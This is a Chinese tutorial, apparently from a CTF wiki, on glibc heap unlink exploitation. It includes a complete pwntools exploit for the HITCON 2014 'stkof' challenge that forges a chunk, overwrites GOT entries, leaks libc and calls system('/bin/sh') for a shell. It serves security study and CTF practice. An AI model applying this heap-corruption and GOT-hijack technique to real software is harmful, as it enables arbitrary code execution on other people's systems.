# Unlink

## 原理

利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。
unlink 的目的与过程：

- 目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并。
- 过程如下：
  ![Alt](img/unlink_smallbin_intro.png)

## 古老的unlink

在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码

```c++
// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");               \
// 检查 fd 和 bk 指针(双向链表完整性检查)
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \

  // largebin 中 next_size 双向链表完整性检查
              if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr (check_action,                                      \
                               "corrupted double-linked list (not small)",    \
                               P, AV);
```

现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（比如溢出）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时:

- glibc 判断这个块是 small chunk
- 判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并
- 判断后向合并，发现后一个 chunk 处于空闲状态，需要合并
- 继而对 Nextchunk 采取 unlink 操作

> 注意，unlink是对将要释放的chunk物理上前一个或后一个空闲chunk操作

## 当前的unlink

通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要

- fakeFD -> bk == P <=> *(fakeFD + 12) == P
- fakeBK -> fd == P <=> *(fakeBK + 8) == P

当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：

- fakeFD -> bk = fakeBK <=> *(fakeFD + 12) = fakeBK
- fakeBK -> fd = fakeFD <=> *(fakeBK + 8) = fakeFD

如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：

- *P = P - 8
- *P = P - 12

即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。

## 利用思路

### 条件

- UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针
- 已知位置存在一个指针指向可进行 UAF 的 chunk

### 效果

使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18

### 思路

设指向可 UAF chunk 的指针的地址为 ptr

- 修改 fd 为 ptr - 0x18
- 修改 bk 为 ptr - 0x10
- 触发 unlink

ptr 处的指针会变为 ptr - 0x18

## 实例1 2014 HITCON stkof

### 基本功能

程序存在 4 个功能，经过 IDA 分析后可以分析功能如下

- Malloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 bss_heap
- Read：根据指定索引，向分配的内存处读入数据，数据长度可控，这里存在堆溢出的情况
- Free：根据指定索引，释放已经分配的内存块
- useless：无用

### 利用

在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。

由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下

- 利用 unlink 修改 `bss_heap[2]` 为 `&bss_heap[2]-0x18`
- 利用编辑功能修改 `bss_heap[0]` 为 `free@got` 地址，同时修改 `bss_heap[1]` 为 `puts@got` 地址，`bss_heap[2]` 为 `atoi@got` 地址
- 修改 free@got 为 puts@plt 的地址，从而当再次调用 free 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容
- `free bss_heap[2]`，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址
- 修改 atoi@got 为 system 函数地址，再次调用时，输入 /bin/sh 地址即可

### Exploit

> 注意，当chunk空闲时，fd，bk才生效（二者位于chunk不空闲时的user data域）

```python
from pwn import *
from LibcSearcher import *
context.arch='amd64'
# context.log_level="DEBUG"
context.log_level="INFO"

p = process('./stkof')
elf = ELF('./stkof',checksec=False)
bss_heap = 0x602140

def read(content,size,index):
    p.sendline('2')
    p.sendline(str(index))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n',timeout=1)

def malloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n',timeout=1)

def free(index):
    p.sendline('3')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

# trigger to malloc buffer for io function
malloc(0x100)   # index 1
# begin
malloc(0x30)    # index 2
# small chunk size in order to trigger unlink
malloc(0x80)    # index 3
# debug()

# a fake chunk at global[2]=head+16 who's size is 0x20
payload = p64(0) # prev_szie
payload += p64(0x20) # size
payload += p64(bss_heap + 16 - 0x18) # fd
payload += p64(bss_heap + 16 - 0x10) # bk
payload += p64(0x20) # next chunk's prev_size bypass the check
payload = payload.ljust(0x30,'a')

# overwrite bss_heap[3]'s chunk's prev_size
# make it believe that prev chunk is at bss_heap[2]
payload += p64(0x30)
# make it believe that prev chunk is free
payload += p64(0x90)

read(payload,len(payload),2)
# debug()

# addr                prev                size                 status              fd                bk
# 0xed1000            0x0                 0x1010               Used                None              None
# 0xed2010            0x0                 0x110                Used                None              None
# 0xed2120            0x0                 0x410                Used                None              None
# 0xed2530            0x0                 0x40                 Freed                0x0              0x20
# 0xed2570            0x30                0x90                 Used                None              None
# pwndbg> x/16g 0xed2530
# 0xed2530:   0x0000000000000000  0x0000000000000041
# 0xed2540:   0x0000000000000000  0x0000000000000020
# 0xed2550:   0x0000000000602138  0x0000000000602140
# 0xed2560:   0x0000000000000020  0x6161616161616161
# 0xed2570:   0x0000000000000030  0x0000000000000090 <== set prev_inuse to 0x90(size= 0x90,prev_inuse= 0)
# 0xed2580:   0x0000000000000000  0x0000000000000000
# 0xed2590:   0x0000000000000000  0x0000000000000000
# 0xed25a0:   0x0000000000000000  0x0000000000000000

free(3)
# after unlink
# FD->bk=BK,BK->fd=FD
# here BK point to bss_heap[0],FD point to &bss_heap-8
# finally, &bss_heap +8+8 ++>bss_heap[2](FD->bk=BK),&bss_heap-8 + 8+8 ==>bss_heap[2](BK->fd=FD)
# debug()

# pwndbg> x/16g 0x0000000000602140
# 0x602140:   0x0000000000000000  0x0000000002309020
# 0x602150:   0x0000000000602138  0x0000000000000000 <== bss_heap[2] point to 0x0000000000602138
# 0x602160:   0x0000000000000000  0x0000000000000000
# 0x602170:   0x0000000000000000  0x0000000000000000
# 0x602180:   0x0000000000000000  0x0000000000000000
# 0x602190:   0x0000000000000000  0x0000000000000000
# 0x6021a0:   0x0000000000000000  0x0000000000000000
# 0x6021b0:   0x0000000000000000  0x0000000000000000

 # overwrite bss_heap[0] = free@got, bss_heap[1]=puts@got, bss_heap[2]=atoi@got
payload = "A"*8 + flat([elf.got['free'], elf.got['puts'], elf.got['atoi']])
read(payload,len(payload),2)
# debug()

# pwndbg> x/16g 0x602138
# 0x602138:   0x4141414141414141  0x0000000000602018 <== bss_heap[0] was changed and point to free@got
# 0x602148:   0x0000000000602020  0x0000000000602088 <== also bss_heap[1] and bss_heap[2] was changed, and point to puts@got,atoi@got
# 0x602158:   0x0000000000000000  0x0000000000000000
# 0x602168:   0x0000000000000000  0x0000000000000000
# 0x602178:   0x0000000000000000  0x0000000000000000
# 0x602188:   0x0000000000000000  0x0000000000000000
# 0x602198:   0x0000000000000000  0x0000000000000000
# 0x6021a8:   0x0000000000000000  0x0000000000000000

# edit free@got to puts@plt
payload = p64(elf.plt['puts'])
read(payload,len(payload),0)
# debug()

# pwndbg> x/16g 0x0000000000602018
# 0x602018 <free@got.plt>:    0x0000000000400760  0x00007f1ece149690 <== 0x0000000000400760 was point to puts@plt
# 0x602028 <fread@got.plt>:   0x00007f1ece1481a0  0x0000000000400786
# 0x602038 <__stack_chk_fail@got.plt>:    0x0000000000400796  0x00007f1ece12f800
# 0x602048 <alarm@got.plt>:   0x00007f1ece1a6200  0x00007f1ece0fa740
# 0x602058 <fgets@got.plt>:   0x00007f1ece147ad0  0x00007f1ece110eb0
# 0x602068 <__gmon_start__@got.plt>:  0x00000000004007f6  0x00007f1ece15e130
# 0x602078 <fflush@got.plt>:  0x00007f1ece1477a0  0x00007f1ece110ea0
# 0x602088 <atoi@got.plt>:    0x00007f1ece110e80  0x0000000000000000

 # free bss_heap[1] to leak puts addr
free(1)
# function free here will call the reall free in os,
# but the free@got was rewrite to point to put@plt,
# so it wiil call the puts and use index 1's content which is puts@got as a parameter of puts
p.recvuntil('OK\n')
puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr, binsh))

# modify atoi@got to system addr
payload = p64(system_addr)
read(payload, len(payload), 2)
# debug()

# pwndbg> x/16g 0x0000000000602088
# 0x602088 <atoi@got.plt>:    0x00007fe7dfab2390  0x0000000000000000 <== 0x00007fe7dfab2390 was point to the reall address of system
# 0x602098:   0x0000000000000000  0x0000000000000000
# 0x6020a8:   0x0000000000000000  0x0000000000000000
# 0x6020b8:   0x0000000000000000  0x00007fe7dfe32620
# 0x6020c8:   0x0000000000000000  0x00007fe7dfe318e0
# 0x6020d8:   0x0000000000000000  0x0000000000000000
# 0x6020e8:   0x0000000000000000  0x0000000000000000
# 0x6020f8:   0x0000000000000000  0x0000000000000003

p.send(p64(binsh))
# Previous step, atoi@got was rewrite to point to system,
# from the program, when finish some function(ex.read,free,malloc,etc),
# it will call atoi to transfer our input to get corret option,
# but here we rewrite the atoi,
# so it will call system and use our input which is p64(binsh) as a parameter of system
p.interactive()
```
